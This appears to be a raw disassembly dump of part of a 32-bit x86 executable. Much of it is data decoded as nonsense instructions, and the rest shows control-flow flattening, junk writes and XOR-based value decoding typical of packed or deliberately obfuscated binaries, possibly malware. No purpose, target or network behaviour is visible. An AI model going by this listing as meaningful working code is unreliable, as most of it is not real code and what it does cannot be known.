  408b07:	sub    DWORD PTR [esi+0x54],eax
  408b0a:	adc    BYTE PTR [esi+0x14c40689],dl
  408b10:	lock lds edi,FWORD PTR ds:[edx+0x576da28d]
  408b18:	xor    esp,0x4
  408b1b:	dec    esi
  408b1c:	in     al,0xc5
  408b1e:	push   ecx
  408b1f:	shl    esp,1
  408b21:	stos   BYTE PTR es:[edi],al
  408b22:	(bad)  
  408b23:	popa   
  408b24:	mov    ah,0x20
  408b26:	sbb    DWORD PTR [edi+0x6d],eax
  408b29:	bound  ebx,QWORD PTR [edx-0x3c7f50e7]
  408b2f:	clc    
  408b30:	push   cs
  408b31:	bound  edi,QWORD PTR [ebx+0x17779a5e]
  408b37:	pop    edi
  408b38:	fadd   st,st(4)
  408b3a:	in     eax,0x3a
  408b3c:	repz dec eax
  408b3e:	aaa    
  408b3f:	out    0xd9,al
  408b41:	cld    
  408b42:	mov    dl,0x5d
  408b44:	push   0xffffffe1
  408b46:	push   esi
  408b47:	mov    gs,edx
  408b49:	imul   esp,DWORD PTR [edi+0x318b47a9],0x48
  408b50:	and    DWORD PTR [ecx+0x3715f196],0xf6e0cb90
  408b5a:	jl     0x408afe
  408b5c:	aam    0x29
  408b5e:	sub    eax,0x9f90a8bf
  408b63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408b64:	in     eax,dx
  408b65:	loopne 0x408b89
  408b67:	mov    ebp,0x2f513d8e
  408b6c:	lahf   
  408b6d:	inc    edx
  408b6e:	lds    esp,FWORD PTR [ebx-0x4b65e2a2]
  408b74:	sub    ecx,ecx
  408b76:	inc    esi
  408b77:	jp     0x408b5f
  408b79:	call   0xc6dc:0xca5fe2a2
  408b80:	(bad)  
  408b81:	adc    eax,DWORD PTR ds:0x5250697f
  408b87:	scas   eax,DWORD PTR es:[edi]
  408b88:	and    DWORD PTR [edi-0x16],ebp
  408b8b:	xor    ecx,DWORD PTR [ebp+0x34c4f65a]
  408b91:	cmp    ebx,esi
  408b93:	cmp    BYTE PTR [eax-0x49dbf170],ah
  408b99:	icebp  
  408b9a:	jmp    0x89439dc6
  408b9f:	cdq    
  408ba0:	adc    eax,0xff164958
  408ba5:	mov    edi,0xddc24591
  408baa:	pop    edi
  408bab:	or     al,0x68
  408bad:	add    al,0xb7
  408baf:	retf   
  408bb0:	jl     0x408b3f
  408bb2:	ret    
  408bb3:	mov    ds:0x9f7026af,al
  408bb8:	in     eax,dx
  408bb9:	std    
  408bba:	stos   DWORD PTR es:[edi],eax
  408bbb:	aas    
  408bbc:	cli    
  408bbd:	popa   
  408bbe:	add    edx,eax
  408bc0:	fiadd  WORD PTR [edi+edi*1]
  408bc3:	mov    dl,0x8e
  408bc5:	sbb    edi,DWORD PTR [eax+0x4b]
  408bc8:	add    BYTE PTR [edx+0x53],bh
  408bcb:	fild   DWORD PTR [edi+0x34b26b26]
  408bd1:	stos   BYTE PTR es:[edi],al
  408bd2:	dec    edi
  408bd3:	out    0xac,al
  408bd5:	hlt    
  408bd6:	pop    es
  408bd7:	cmp    BYTE PTR [esp+edx*8],ch
  408bda:	imul   ecx,DWORD PTR [edx+0x74],0x20bf2355
  408be1:	mov    dh,0xad
  408be3:	mov    ds:0x9dbc3476,al
  408be8:	mov    eax,ds:0x3a2ca9e2
  408bed:	(bad)  
  408bee:	push   esp
  408bef:	jbe    0x408c2e
  408bf1:	and    ebx,0xcd0466ab
  408bf7:	iret   
  408bf8:	cmp    eax,0xd6ca0fdb
  408bfd:	add    dl,ah
  408bff:	and    DWORD PTR [eax],esp
  408c01:	xchg   edi,eax
  408c02:	stos   DWORD PTR es:[edi],eax
  408c03:	out    0x16,al
  408c05:	mov    ds,WORD PTR [edx]
  408c07:	add    al,0x88
  408c09:	es mov edx,0x566f1475
  408c0f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408c10:	jno    0x408c8b
  408c12:	sbb    al,0xb0
  408c14:	int3   
  408c15:	mov    esi,0xdd8c723a
  408c1a:	adc    eax,0xd0b8c63c
  408c1f:	cmc    
  408c20:	xchg   esi,eax
  408c21:	fistp  QWORD PTR [edi]
  408c23:	inc    esi
  408c24:	xchg   dh,dl
  408c26:	clc    
  408c27:	push   es
  408c28:	outs   dx,BYTE PTR ds:[esi]
  408c29:	push   ss
  408c2a:	arpl   WORD PTR [edx],cx
  408c2c:	outs   dx,BYTE PTR ds:[esi]
  408c2d:	lds    edi,FWORD PTR [eax-0x34d76c10]
  408c33:	sbb    DWORD PTR [edx],esp
  408c35:	or     BYTE PTR [esi+0x33],al
  408c38:	shl    DWORD PTR [eax+0x2c],cl
  408c3b:	test   BYTE PTR [ecx-0x49ec8acf],cl
  408c41:	std    
  408c42:	loopne 0x408c6f
  408c44:	aaa    
  408c45:	add    dh,BYTE PTR [ebx-0x577dd100]
  408c4b:	xor    ch,dl
  408c4d:	or     edi,ecx
  408c4f:	out    0x4a,eax
  408c51:	jne    0x408c98
  408c57:	mov    eax,ds:0x41497e
  408c5c:	mov    eax,DWORD PTR [eax]
  408c5e:	mov    DWORD PTR ds:0x434743,0x3b52
  408c68:	mov    DWORD PTR [ebp-0x14],eax
  408c6b:	mov    eax,ds:0x414b86
  408c70:	mov    DWORD PTR ds:0x434707,0x120a
  408c7a:	mov    eax,DWORD PTR [eax]
  408c7c:	mov    DWORD PTR ds:0x434737,0x2b06
  408c86:	mov    DWORD PTR [ebp-0x18],eax
  408c89:	mov    DWORD PTR ds:0x43466f,0x61a0
  408c93:	jmp    0x4092c1
  408c98:	mov    DWORD PTR ds:0x43477f,0x680c
  408ca2:	cmp    edi,0x33c
  408ca8:	mov    DWORD PTR ds:0x4346f7,0x197
  408cb2:	jne    0x408fac
  408cb8:	jmp    0x408f40
  408cbd:	call   0x641af49f
  408cc2:	je     0x408d41
  408cc4:	fnsave [eax-0x52]
  408cc7:	inc    ecx
  408cc8:	leave  
  408cc9:	ret    0xc976
  408ccc:	fild   DWORD PTR [ebp+eiz*8+0x7e]
  408cd0:	jle    0x408cb3
  408cd2:	js     0x408d52
  408cd4:	jle    0x408d1b
  408cd6:	add    cl,al
  408cd8:	mov    ds:0xaaf3fec8,eax
  408cdd:	or     bl,ah
  408cdf:	jmp    0x5fc98875
  408ce4:	cs cmp al,0x91
  408ce7:	or     BYTE PTR [edx-0x36f7e0a6],ch
  408ced:	sub    eax,0x360271ba
  408cf2:	mov    esp,DWORD PTR [edx]
  408cf4:	shl    ebx,0x7b
  408cf7:	xchg   esi,eax
  408cf8:	sbb    esp,DWORD PTR ds:0x7d3e0226
  408cfe:	cmp    ah,ah
  408d00:	jno    0x408cf1
  408d02:	pop    ss
  408d03:	retf   
  408d04:	jp     0x408cc7
  408d06:	lods   eax,DWORD PTR ds:[esi]
  408d07:	push   es
  408d08:	(bad)  
  408d09:	neg    DWORD PTR [ebp-0xd73900f]
  408d0f:	sar    eax,1
  408d11:	pop    es
  408d12:	mov    dh,0xd3
  408d14:	pop    esp
  408d15:	sub    BYTE PTR [esi+eax*2+0x585ecdab],0x57
  408d1d:	add    al,0x91
  408d1f:	mov    DWORD PTR [esi-0xd],ebx
  408d22:	imul   esp,DWORD PTR [ebx],0x27401eb8
  408d28:	outs   dx,BYTE PTR ds:[esi]
  408d29:	xor    bl,BYTE PTR [ebx]
  408d2b:	mov    dl,0xc3
  408d2d:	retf   0x8b5
  408d30:	mov    ecx,0xae9d29a1
  408d35:	ins    BYTE PTR es:[edi],dx
  408d36:	iret   
  408d37:	mov    cs,WORD PTR [ecx-0x4f84028c]
  408d3d:	retf   
  408d3e:	pop    ebp
  408d3f:	jg     0x408db8
  408d41:	out    0xee,eax
  408d43:	hlt    
  408d44:	enter  0xedeb,0x8c
  408d48:	adc    edx,DWORD PTR [edi-0x20]
  408d4b:	fisub  DWORD PTR [edx+edx*8-0x2]
  408d4f:	xor    DWORD PTR ss:[ebp-0x44409640],0x73
  408d57:	sub    ch,BYTE PTR [ebx]
  408d59:	(bad)  
  408d5a:	ss mov ebx,0x81a61acc
  408d60:	pop    edx
  408d61:	test   ah,al
  408d63:	lods   eax,DWORD PTR ds:[esi]
  408d64:	push   ds
  408d65:	aaa    
  408d66:	outs   dx,DWORD PTR ds:[esi]
  408d67:	dec    ebp
  408d68:	xor    eax,0x7d955957
  408d6d:	scas   al,BYTE PTR es:[edi]
  408d6e:	fmul   QWORD PTR [esi-0x57]
  408d71:	cwde   
  408d72:	mov    ds:0xf35fa8c8,eax
  408d77:	mov    esi,0xb25bf766
  408d7c:	dec    ebp
  408d7d:	cdq    
  408d7e:	(bad)
  408d81:	sahf   
  408d82:	sbb    esp,DWORD PTR [esi+0x3e]
  408d85:	shl    DWORD PTR [edi-0x5d],0xe0
  408d89:	daa    
  408d8a:	mov    ebp,DWORD PTR [ecx+0x38]
  408d8d:	adc    ebp,ebx
  408d8f:	cmp    al,0x87
  408d91:	dec    esp
  408d92:	jp     0x408d88
  408d94:	jbe    0x408d95
  408d96:	xor    ch,BYTE PTR [ebx+0x513a6187]
  408d9c:	retf   
  408d9d:	cmp    BYTE PTR [edx-0x2f],dl
  408da0:	lds    edi,FWORD PTR [ebp+0x4a01f533]
  408da6:	jo     0x408d39
  408da8:	or     BYTE PTR ds:0xc6f20517,bl
  408dae:	jb     0x408d61
  408db0:	imul   esp
  408db2:	push   eax
  408db3:	cmp    dh,al
  408db5:	nop
  408db6:	xor    al,BYTE PTR [edi+0x1c96060d]
  408dbc:	inc    ecx
  408dbd:	or     edi,ecx
  408dbf:	mov    dh,0x32
  408dc1:	fstp   TBYTE PTR [ecx+ebp*2]
  408dc4:	mov    dh,0xdf
  408dc6:	xchg   ebp,eax
  408dc7:	push   eax
  408dc8:	sar    esp,0x95
  408dcb:	sbb    BYTE PTR [esi+0x710c7e38],0x36
  408dd2:	jge    0x408de9
  408dd4:	jp     0x408d70
  408dd6:	sbb    edx,0x35aa750
  408ddc:	popf   
  408ddd:	mov    ecx,0x32b278b6
  408de2:	aaa    
  408de3:	sbb    eax,0xe6ec1481
  408de8:	loopne 0x408d75
  408dea:	int    0xd9
  408dec:	call   0xca38:0x25f14bf5
  408df3:	(bad)  
  408df4:	(bad)  
  408df5:	aas    
  408df6:	retf   0xe558
  408df9:	(bad)  
  408dfa:	cli    
  408dfb:	(bad)  [edx]
  408dfd:	ret    
  408dfe:	test   eax,0xd15f1d5e
  408e03:	call   0x9e61f6a5
  408e08:	popf   
  408e09:	jne    0x408d94
  408e0b:	cmp    DWORD PTR [eax-0x1],edx
  408e0e:	xor    BYTE PTR [edi],dh
  408e10:	out    dx,eax
  408e11:	jg     0x408e8e
  408e13:	jle    0x408dd0
  408e15:	adc    ecx,esp
  408e17:	(bad)  
  408e18:	mov    edx,ebp
  408e1a:	xchg   edi,eax
  408e1b:	pop    edx
  408e1c:	dec    ecx
  408e1d:	add    BYTE PTR [esi+0x31ce246c],bl
  408e23:	mov    cs,WORD PTR [ecx+ecx*1-0x6d]
  408e27:	jne    0x408e51
  408e29:	lea    eax,[ebp+0x2c0b3e0]
  408e2f:	mov    DWORD PTR [esi+ebx*2],0xb1d9e413
  408e36:	mov    dh,0x83
  408e38:	js     0x408e39
  408e3a:	inc    edi
  408e3b:	cmp    DWORD PTR [eax-0x5f5f5bb6],ebp
  408e41:	sbb    cl,BYTE PTR [edi+0x52054c43]
  408e47:	inc    ebp
  408e48:	dec    eax
  408e49:	adc    BYTE PTR [esi+0x23],cl
  408e4c:	adc    cl,BYTE PTR [eax-0x70]
  408e4f:	pop    es
  408e50:	mov    ds:0x3a904dfd,eax
  408e55:	adc    BYTE PTR [edi+0x1139cf4a],0x22
  408e5c:	or     al,0xeb
  408e5e:	add    BYTE PTR [ebx],ah
  408e60:	xchg   edi,eax
  408e61:	repnz inc edi
  408e63:	lock fimul WORD PTR [esi+0x32]
  408e67:	xchg   esp,eax
  408e68:	jecxz  0x408e6b
  408e6a:	xor    ecx,DWORD PTR [edi]
  408e6c:	pushf  
  408e6d:	dec    esi
  408e6e:	sbb    DWORD PTR ds:0x4ddb07ec,ebp
  408e74:	adc    ebp,0xffffffef
  408e77:	xlat   BYTE PTR ds:[ebx]
  408e78:	cwde   
  408e79:	and    eax,0xfbf8d7a8
  408e7e:	dec    eax
  408e7f:	sub    al,0x5b
  408e81:	pop    esp
  408e82:	call   0xb651:0x33dbdd7
  408e89:	inc    esp
  408e8a:	cmp    DWORD PTR [eax-0x76],ecx
  408e8d:	mov    eax,ds:0xc686b84e
  408e92:	xor    DWORD PTR [edx+0x79],ecx
  408e95:	ins    BYTE PTR es:[edi],dx
  408e96:	adc    al,0x2c
  408e98:	jae    0x408e8b
  408e9a:	sub    eax,0x809f582
  408e9f:	mov    esi,0xb8ca7c2e
  408ea4:	sbb    al,0xe8
  408ea6:	inc    edi
  408ea7:	jne    0x408eda
  408ea9:	jg     0x408efb
  408eab:	call   0x63d868b8
  408eb0:	popf   
  408eb1:	mov    cl,0x1
  408eb3:	xchg   DWORD PTR [bx+di],esi
  408eb6:	out    dx,eax
  408eb7:	sub    eax,0x778e9940
  408ebc:	enter  0xe6f5,0x6
  408ec0:	imul   esi,DWORD PTR [ebp-0x478d43e0],0xffffffcd
  408ec7:	arpl   dx,bp
  408ec9:	and    esi,ebx
  408ecb:	rcl    DWORD PTR ds:0x4d33040,cl
  408ed1:	les    esi,FWORD PTR [edx-0x7791c498]
  408ed7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408ed8:	call   ebx
  408eda:	nop
  408edb:	sbb    eax,0x53b55bc5
  408ee0:	sub    DWORD PTR [esi-0x42],0x502813db
  408ee7:	adc    al,0xfc
  408ee9:	popf   
  408eea:	or     eax,0x88985764
  408eef:	daa    
  408ef0:	fwait
  408ef1:	shr    DWORD PTR [edx+0x47],0x96
  408ef5:	lea    ecx,[esi+ecx*2+0x42]
  408ef9:	jle    0x408ea8
  408efb:	loop   0x408f5b
  408efd:	xor    edx,DWORD PTR [edx-0x59]
  408f00:	pop    esi
  408f01:	int3   
  408f02:	push   cs
  408f03:	jmp    FWORD PTR [edi+eiz*4]
  408f06:	cmp    dl,BYTE PTR [edx-0x6a]
  408f09:	out    dx,eax
  408f0a:	jecxz  0x408f46
  408f0c:	or     cl,al
  408f0e:	call   0x7719ab89
  408f13:	arpl   WORD PTR [ecx-0x7ae88499],di
  408f19:	adc    BYTE PTR [eax],ah
  408f1b:	scas   eax,DWORD PTR es:[edi]
  408f1c:	inc    edi
  408f1d:	ins    BYTE PTR es:[edi],dx
  408f1e:	aaa    
  408f1f:	jo     0x408f2d
  408f21:	(bad)  
  408f23:	adc    BYTE PTR [edx],al
  408f25:	sbb    eax,0xe3387827
  408f2a:	in     al,dx
  408f2b:	push   ebp
  408f2c:	and    bl,BYTE PTR [ecx-0x3a02075d]
  408f32:	in     eax,0xe4
  408f34:	cwde   
  408f35:	fwait
  408f36:	leave  
  408f37:	cmp    dh,cl
  408f39:	push   ebx
  408f3a:	pop    edi
  408f3b:	outs   dx,BYTE PTR ds:[esi]
  408f3c:	fsubr  DWORD PTR [ebx+0x45]
  408f3f:	push   ecx
  408f40:	and    DWORD PTR [ebp+0x8],0x0
  408f44:	mov    eax,DWORD PTR [ebp-0x8]
  408f47:	or     DWORD PTR ds:0x434743,0x434703
  408f51:	sub    eax,DWORD PTR [ebp+0x8]
  408f54:	push   eax
  408f55:	mov    eax,ds:0x434783
  408f5a:	or     DWORD PTR ds:0x434743,eax
  408f60:	mov    eax,DWORD PTR [ebp-0x4]
  408f63:	add    DWORD PTR ds:0x43465f,0x4346cf
  408f6d:	add    eax,DWORD PTR [ebp+0x8]
  408f70:	sub    DWORD PTR ds:0x434747,0x4346c7
  408f7a:	push   eax
  408f7b:	dec    DWORD PTR ds:0x43466b
  408f81:	call   0x4092e7
  408f86:	mov    DWORD PTR ds:0x434737,0x29a7
  408f90:	inc    DWORD PTR [ebp+0x8]
  408f93:	cmp    DWORD PTR [ebp+0x8],0x52
  408f97:	mov    DWORD PTR ds:0x43467f,0x7d48
  408fa1:	jb     0x408f44
  408fa7:	jmp    0x4092c1
  408fac:	cmp    edi,0x1a2
  408fb2:	jne    0x40928f
  408fb8:	mov    DWORD PTR [ebp-0x60],0xf89c853a
  408fbf:	mov    eax,DWORD PTR [ebp-0x4]
  408fc2:	mov    DWORD PTR [ebp-0x5c],eax
  408fc5:	mov    eax,DWORD PTR [ebp-0x8]
  408fc8:	mov    DWORD PTR [ebp-0x58],eax
  408fcb:	mov    eax,DWORD PTR [ebp-0xc]
  408fce:	jmp    0x409256
  408fd3:	mov    BYTE PTR [edi],al
  408fd5:	xchg   esi,eax
  408fd6:	jno    0x408f69
  408fd8:	jno    0x409043
  408fda:	out    0xcb,eax
  408fdc:	fisttp DWORD PTR [esi+esi*1+0x66a8fc6f]
  408fe3:	das    
  408fe4:	loopne 0x409064
  408fe6:	jle    0x408fc9
  408fe8:	js     0x409068
  408fea:	jle    0x40900e
  408fec:	mov    ah,0x15
  408fee:	mov    al,0x28
  408ff0:	aaa    
  408ff1:	imul   ebx,esi,0x4a8a9a87
  408ff7:	inc    eax
  408ff8:	and    al,ah
  408ffa:	xlat   BYTE PTR ds:[ebx]
  408ffb:	fisubr DWORD PTR [ebp+0x39ff421d]
  409001:	mul    BYTE PTR ds:0x3ed3f4d4
  409007:	outs   dx,BYTE PTR ds:[esi]
  409008:	mov    ss,WORD PTR [edx]
  40900a:	call   0xbd8d883
  40900f:	cmp    al,0xcd
  409011:	js     0x40902b
  409013:	xchg   edi,eax
  409014:	add    eax,0xb9c4da70
  409019:	pop    eax
  40901a:	sbb    eax,0x24de5b9e
  40901f:	mov    dh,0xaa
  409021:	das    
  409022:	(bad)  
  409024:	enter  0x8bfe,0xed
  409028:	call   0xf088:0x9fbbe332
  40902f:	sbb    BYTE PTR [edx-0x6a710706],cl
  409035:	enter  0xaec2,0xfb
  409039:	dec    edi
  40903a:	jnp    0x408fd0
  40903c:	ins    BYTE PTR es:[edi],dx
  40903d:	and    al,0x9f
  40903f:	sbb    DWORD PTR [eax+eax*8-0x44d41b7f],eax
  409046:	mov    ebp,DWORD PTR [esp+eiz*4-0x1782af9c]
  40904d:	imul   ecx,DWORD PTR [edi+0x2fddb391],0x40
  409054:	icebp  
  409055:	pop    edi
  409056:	mov    ds:0x5479e9c3,eax
  40905b:	fdivr  st(3),st
  40905d:	cmc    
  40905e:	imul   BYTE PTR [esi+0x34]
  409061:	mov    al,0xe6
  409063:	in     al,0x36
  409065:	pop    esp
  409066:	ds jmp 0x4090e8
  409069:	in     al,0xb6
  40906b:	(bad)  
  40906d:	out    0xd7,al
  40906f:	xchg   esp,eax
  409070:	stos   DWORD PTR es:[edi],eax
  409071:	(bad)  
  409072:	das    
  409073:	nop
  409074:	shl    cl,0x26
  409077:	lods   al,BYTE PTR ds:[esi]
  409078:	and    eax,0x1ef55d33
  40907d:	bound  esp,QWORD PTR [esi+edi*4]
  409080:	and    ah,ah
  409082:	sub    al,0xd
  409084:	pop    ds
  409085:	(bad)  
  409086:	cmc    
  409087:	dec    ebx
  409088:	add    eax,0xfc3c69a4
  40908d:	fst    QWORD PTR [edx+0x78548ca1]
  409093:	stc    
  409094:	cmp    BYTE PTR [esi*4+0x731cf5d2],bh
  40909b:	push   esi
  40909c:	inc    DWORD PTR [eax]
  40909e:	int    0x5a
  4090a0:	pop    eax
  4090a2:	stos   BYTE PTR es:[edi],al
  4090a3:	xchg   edi,eax
  4090a4:	mov    es,WORD PTR [esi+ebp*4+0x5c]
  4090a8:	repz fild WORD PTR gs:[bx-0x7e6d]
  4090af:	cli    
  4090b0:	(bad)  
  4090b1:	push   ss
  4090b2:	in     eax,0xee
  4090b4:	test   al,0xd9
  4090b6:	sbb    esp,DWORD PTR [edi]
  4090b8:	rol    BYTE PTR [edx],cl
  4090ba:	test   BYTE PTR [esi-0x3f],0x6f
  4090be:	xor    DWORD PTR [edx],ebp
  4090c0:	mov    edx,0x9e0a8ddf
  4090c5:	mov    ds:0x62c80435,eax
  4090ca:	icebp  
  4090cb:	pushf  
  4090cc:	push   ebx
  4090cd:	adc    ch,BYTE PTR [ecx]
  4090cf:	jle    0x4090f0
  4090d1:	loop   0x4090e9
  4090d3:	mov    cl,bl
  4090d5:	sahf   
  4090d6:	mov    WORD PTR [edi],ds
  4090d8:	pop    esi
  4090d9:	repnz add eax,0x7c4ee92a
  4090df:	int    0xe4
  4090e1:	fs ret 
  4090e3:	mov    dh,0x38
  4090e5:	jg     0x409149
  4090e7:	fmul   DWORD PTR [edx+0x283f15ec]
  4090ed:	push   ecx
  4090ee:	fcmove st,st(3)
  4090f0:	and    BYTE PTR [ebx-0x49],dl
  4090f3:	call   0x7ec0:0xea034a16
  4090fa:	inc    esi
  4090fb:	sbb    BYTE PTR ds:0x21174f62,0xd0
  409102:	rcr    DWORD PTR [esi],0xa3
  409105:	int    0x6d
  409107:	fsub   DWORD PTR [esi-0x6d]
  40910a:	icebp  
  40910b:	or     esi,DWORD PTR [esi-0x2bae460a]
  409111:	jb     0x4090e8
  409113:	push   edx
  409114:	push   0x1b
  409116:	push   es
  409117:	and    ecx,DWORD PTR [ebp+0x2e0e2327]
  40911d:	add    ah,BYTE PTR [ecx+0x7c]
  409120:	adc    eax,0xbcc5dd49
  409125:	push   es
  409126:	out    dx,al
  409127:	sbb    dl,bh
  409129:	lahf   
  40912a:	scas   al,BYTE PTR es:[edi]
  40912b:	imul   edi,DWORD PTR [ecx-0x74],0x611eee66
  409132:	test   BYTE PTR [edx+0x73],dh
  409135:	mov    dl,0x3e
  409137:	ds fcomp st(6)
  40913a:	xchg   ebx,eax
  40913b:	and    DWORD PTR [eax+0x74],eax
  40913e:	loopne 0x40916f
  409140:	sbb    al,0x6b
  409142:	rcl    BYTE PTR ss:[edx-0x22],1
  409146:	imul   ebp,ebx,0x3c
  409149:	pop    eax
  40914a:	aam    0x9c
  40914c:	loop   0x4090d7
  40914e:	jge    0x4090f3
  409150:	xchg   esi,eax
  409151:	(bad)  
  409152:	stc    
  409153:	pop    esi
  409154:	adc    BYTE PTR [esi+0x25],0xfe
  409158:	or     al,0xd3
  40915a:	inc    edx
  40915b:	pop    ebx
  40915c:	imul   esi,DWORD PTR [ebp-0x1d],0x49208083
  409163:	dec    ebx
  409164:	into   
  409165:	adc    cl,BYTE PTR [edi+ebx*8-0x3179d127]
  40916c:	pushw  0x3f41
  409170:	mov    eax,ds:0xb6e33628
  409175:	jb     0x409179
  409177:	mov    dh,0x93
  409179:	dec    ecx
  40917a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40917b:	or     eax,0x2962f5b
  409180:	daa    
  409181:	lods   eax,DWORD PTR ds:[esi]
  409182:	les    ebp,FWORD PTR [ebx+0x44a3ed6]
  409188:	(bad)  
  409189:	in     al,dx
  40918a:	int3   
  40918b:	mov    edx,0x6f9a0f42
  409190:	mov    esp,edi
  409192:	mov    bl,0x90
  409194:	icebp  
  409195:	mov    cl,0x66
  409197:	pop    ecx
  409198:	test   eax,0xf53692e
  40919d:	push   esi
  40919e:	and    al,0x51
  4091a0:	inc    ebx
  4091a1:	sbb    BYTE PTR [edi-0x75753c1e],al
  4091a7:	hlt    
  4091a8:	(bad)  
  4091a9:	jecxz  0x409211
  4091ab:	cmp    DWORD PTR [ebx*2-0x73b6300],0x632c2374
  4091b6:	mov    ebp,0x5c1b8766
  4091bb:	fwait
  4091bc:	clc    
  4091bd:	imul   ecx,eax,0x4600ef9b
  4091c3:	xor    DWORD PTR [esi+0x8],ebx
  4091c6:	fidivr DWORD PTR [esp+eax*8-0x7d8dc3f0]
  4091cd:	add    bl,BYTE PTR [ecx+ebx*8]
  4091d0:	ins    DWORD PTR es:[edi],dx
  4091d1:	mov    edi,0x581af45b
  4091d6:	cld    
  4091d7:	xor    dh,al
  4091d9:	std    
  4091da:	push   edi
  4091db:	mov    esi,0xe10f371b
  4091e0:	mov    al,ah
  4091e2:	jl     0x4091ff
  4091e4:	cdq    
  4091e5:	rol    ch,0x82
  4091e8:	cmp    al,0xdb
  4091ea:	mov    dh,0x13
  4091ec:	imul   ecx,DWORD PTR [edx],0x37
  4091ef:	mov    ch,0x5d
  4091f1:	adc    DWORD PTR [ebx-0x5538c5cc],eax
  4091f7:	outs   dx,DWORD PTR ds:[esi]
  4091f8:	push   ecx
  4091f9:	xchg   ebp,ebx
  4091fb:	jo     0x409211
  4091fd:	std    
  4091fe:	mov    ds:0xd98b9119,eax
  409203:	mov    gs,ebx
  409205:	push   es
  409206:	inc    ebx
  409207:	addr16 mov ch,0xae
  40920a:	push   ds
  40920b:	push   DWORD PTR [eax+0x7c6fc7ce]
  409211:	and    edi,DWORD PTR [ebx-0x68]
  409214:	sbb    cl,BYTE PTR [ebx]
  409216:	sub    eax,0xc65ea899
  40921b:	adc    ch,dl
  40921d:	test   eax,0xe6e632bc
  409222:	adc    DWORD PTR [eax-0x7ca4f182],esp
  409228:	in     al,0x8c
  40922a:	fsub   DWORD PTR [ebx-0x58]
  40922d:	cmp    al,0xf
  40922f:	pushf  
  409230:	div    bl
  409232:	xor    al,0x5c
  409234:	jns    0x40920c
  409236:	inc    edi
  409237:	lds    esp,FWORD PTR [esi]
  409239:	dec    ebx
  40923a:	icebp  
  40923b:	cmovo  eax,DWORD PTR [edx]
  40923e:	push   edi
  40923f:	dec    edx
  409240:	cmp    al,0xab
  409242:	pusha  
  409243:	stos   BYTE PTR es:[edi],al
  409244:	outs   dx,BYTE PTR ds:[esi]
  409245:	or     al,0x76
  409247:	sbb    DWORD PTR [ebp+0x41],esi
  40924a:	mov    dl,0x6c
  40924c:	sbb    dl,ch
  40924e:	in     eax,0xf8
  409250:	mov    dh,0x2d
  409252:	xor    bh,al
  409254:	retf   
  409255:	dec    ebx
  409256:	xor    eax,esi
  409258:	add    eax,ebx
  40925a:	mov    DWORD PTR [ebp-0x54],eax
  40925d:	lea    eax,[ebp-0x1c]
  409260:	mov    DWORD PTR [ebp-0x50],eax
  409263:	mov    eax,DWORD PTR [ebp-0x60]
  409266:	xor    eax,esi
  409268:	add    eax,ebx
  40926a:	mov    DWORD PTR [ebp-0x60],eax
  40926d:	lea    eax,[ebp-0x60]
  409270:	push   eax
  409271:	mov    eax,DWORD PTR [ebp+0xc]
  409274:	xor    eax,esi
  409276:	add    eax,ebx
  409278:	push   eax
  409279:	mov    eax,ds:0x414b1e
  40927e:	push   0x414a74
  409283:	push   DWORD PTR [eax]
  409285:	call   0x411333
  40928a:	jmp    0x4092c1
  40928f:	cmp    edi,0x13c
  409295:	jne    0x4092c1
  40929b:	mov    eax,DWORD PTR [ebp-0x10]
  40929e:	xor    eax,esi
  4092a0:	add    eax,ebx
  4092a2:	mov    DWORD PTR [ebp+0x8],eax
  4092a5:	mov    eax,ds:0x414afe
  4092aa:	mov    DWORD PTR [ebp+0x8],eax
  4092ad:	mov    eax,DWORD PTR [ebp-0x14]
  4092b0:	mov    DWORD PTR [ebp-0x4],eax
  4092b3:	mov    eax,DWORD PTR [ebp-0x4]
  4092b6:	push   0x4
  4092b8:	pop    ecx
  4092b9:	sub    ecx,eax
  4092bb:	add    ecx,DWORD PTR [ebp-0x18]
  4092be:	mov    DWORD PTR [ebp-0x8],ecx
  4092c1:	mov    eax,DWORD PTR [ebp+0xc]
  4092c4:	xor    eax,esi
  4092c6:	lea    edi,[edi+eax*1+0x327299]
  4092cd:	cmp    edi,0x50a
  4092d3:	jne    0x4089c6
  4092d9:	mov    eax,DWORD PTR [ebp+0xc]
  4092dc:	pop    edi
  4092dd:	xor    eax,esi
  4092df:	pop    esi
  4092e0:	add    eax,ebx
  4092e2:	pop    ebx
  4092e3:	leave  
  4092e4:	ret    0x8
  4092e7:	push   ebp
  4092e8:	mov    ebp,esp
  4092ea:	sub    esp,0x44
  4092ed:	push   edi
  4092ee:	adc    DWORD PTR ds:0x4346b7,ebx
  4092f4:	mov    eax,DWORD PTR [ebp+0xc]
  4092f7:	mov    DWORD PTR [ebp-0x10],eax
  4092fa:	and    DWORD PTR ds:0x4346bb,0x5787
  409304:	jmp    0x40971b
  409309:	jns    0x4092bd
  40930b:	out    dx,al
  40930c:	std    
  40930d:	jge    0x40938c
  40930f:	or     eax,0x11d61472
  409314:	clc    
  409315:	inc    esp
  409316:	ret    0x2125
  409319:	xchg   edx,eax
  40931a:	loop   0x40939a
  40931c:	jle    0x40938e
  40931e:	jns    0x40939e
  409320:	jle    0x4092b2
  409322:	mov    cl,0x8c
  409324:	jl     0x4092c0
  409326:	sub    DWORD PTR [ebx-0x1b],ebp
  409329:	aas    
  40932a:	jl     0x4093a4
  40932c:	popf   
  40932d:	sub    al,0x3e
  40932f:	pmaxub mm3,QWORD PTR [edx]
  409332:	(bad)  
  409333:	xchg   ebx,eax
  409334:	xchg   esp,eax
  409335:	aam    0xbe
  409337:	cmp    bh,BYTE PTR [eax+0xcce93df]
  40933d:	jno    0x40933c
  40933f:	add    esp,esi
  409341:	shl    DWORD PTR [edx],1
  409343:	cmp    al,0x7d
  409345:	push   ds
  409346:	bound  eax,QWORD PTR [edx]
  409348:	test   eax,0x7110d299
  40934d:	out    0x3e,al
  40934f:	outs   dx,BYTE PTR ds:[esi]
  409350:	pop    edx
  409351:	test   al,0x49
  409353:	inc    BYTE PTR [ebp-0x44]
  409356:	push   eax
  409357:	(bad)  
  409358:	retf   0x989f
  40935b:	stc    
  40935c:	retf   
  40935d:	cli    
  40935e:	add    eax,0x9411c8f2
  409363:	rcr    DWORD PTR [esi+0x7c],cl
  409366:	lods   al,BYTE PTR ds:[esi]
  409367:	and    cl,BYTE PTR [edx+edx*8+0x49]
  40936b:	jnp    0x40933c
  40936d:	push   ecx
  40936e:	xor    edi,edi
  409370:	jecxz  0x409337
